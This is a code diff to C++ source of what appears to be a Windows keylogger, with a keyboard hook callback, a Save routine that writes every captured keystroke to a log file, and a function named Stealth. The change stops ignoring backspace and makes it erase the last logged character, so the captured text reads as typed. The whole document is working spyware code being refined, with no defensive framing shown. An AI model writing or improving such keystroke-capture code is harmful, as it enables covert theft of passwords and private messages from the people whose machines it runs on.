@@ -20,7 +20,6 @@
 
 #if FORMAT == 0
 const std::map<int, std::string> keyname{ 
-	{VK_BACK, "[BACKSPACE]" },
 	{VK_RETURN,	"\n" },
 	{VK_SPACE,	"_" },
 	{VK_TAB,	"[TAB]" },
@@ -72,8 +71,6 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 
 			// Add condition to ignore specific keys
 			if (kbdStruct.vkCode == VK_ESCAPE ||
-				kbdStruct.vkCode == VK_BACK ||
-				kbdStruct.vkCode == VK_DELETE ||
 				kbdStruct.vkCode == VK_LSHIFT ||
 				kbdStruct.vkCode == VK_RSHIFT ||
 				kbdStruct.vkCode == VK_LCONTROL ||
@@ -170,50 +167,61 @@ int Save(int key_stroke)
 		}
 	}
 
-#if FORMAT == 10
-	output << '[' << key_stroke << ']';
-#elif FORMAT == 16
-	output << std::hex << "[" << key_stroke << ']';
-#else
-	if (key_stroke == VK_SPACE)
-	{
-		output << ' ';
-	}
-	else if (keyname.find(key_stroke) != keyname.end())
-	{
-		output << keyname.at(key_stroke);
-	}
-	else
-	{
-		char key;
-		// check caps lock
-		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
-
-		// check shift key
-		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
-			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+	#if FORMAT == 10
+		output << '[' << key_stroke << ']';
+	#elif FORMAT == 16
+		output << std::hex << "[" << key_stroke << ']';
+	#else
+		if (key_stroke == VK_SPACE)
 		{
-			lowercase = !lowercase;
+			output << ' ';
 		}
-
-		// map virtual key according to keyboard layout
-		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
-
-		// tolower converts it to lowercase properly
-		if (!lowercase)
+		else if (keyname.find(key_stroke) != keyname.end())
 		{
-			key = tolower(key);
+			output << keyname.at(key_stroke);
 		}
-		output << char(key);
-	}
-#endif
-	// instead of opening and closing file handlers every time, keep file open and flush.
-	output_file << output.str();
-	output_file.flush();
+		// Attempting to get the backspace key to behave as a backspace key in the log
+		else if (key_stroke == VK_BACK)
+		{
+			// Delete the last character from the log
+			std::streampos pos = output_file.tellp();
+			output_file.seekp(pos - std::streamoff(1));
+			output_file.flush();
+			std::cout << "\b \b";  // Move the console cursor back and overwrite the character with a space
+			return 0;
+		}
+		// End
+		else
+		{
+			char key;
+			// check caps lock
+			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
-	std::cout << output.str();
+			// check shift key
+			if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
+				|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
+			{
+				lowercase = !lowercase;
+			}
 
-	return 0;
+			// map virtual key according to keyboard layout
+			key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
+
+			// tolower converts it to lowercase properly
+			if (!lowercase)
+			{
+				key = tolower(key);
+			}
+			output << char(key);
+		}
+	#endif
+		// instead of opening and closing file handlers every time, keep file open and flush.
+		output_file << output.str();
+		output_file.flush();
+
+		std::cout << output.str();
+
+		return 0;
 }
 void Stealth()
 {
